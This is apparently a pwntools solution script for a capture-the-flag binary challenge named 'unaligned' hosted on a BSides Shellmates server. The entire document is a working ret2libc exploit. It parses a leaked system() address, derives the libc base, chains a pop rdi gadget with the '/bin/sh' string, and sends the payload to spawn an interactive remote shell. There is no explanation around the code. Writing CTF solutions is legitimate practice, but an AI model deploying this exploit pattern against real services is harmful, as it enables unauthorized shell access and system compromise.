from pwn import *

elf = ELF('./unaligned')
context.binary = elf
#p = gdb.debug(elf.path, gdbscript='b main')
p = remote(host='unaligned.bsides.shellmates.club', port=443, ssl=True)
libc = ELF('./libc.so.6')

p.recvuntil('Gift: ')
system = int(p.recv(14), 16)

log.warn('system offset at : ' + str(hex(libc.symbols['system'])))

libc.address = system - libc.symbols['system']

log.warn('system at : ' + str(hex(system)))

bin_sh = p64(next(libc.search(b'/bin/sh\0')))

padding = b'B' * 40

system = p64(system + 0x1b)

pop_rdi = p64(libc.address + 0x2164f)

p.sendline(system * 5 + pop_rdi + bin_sh + system)

p.interactive()
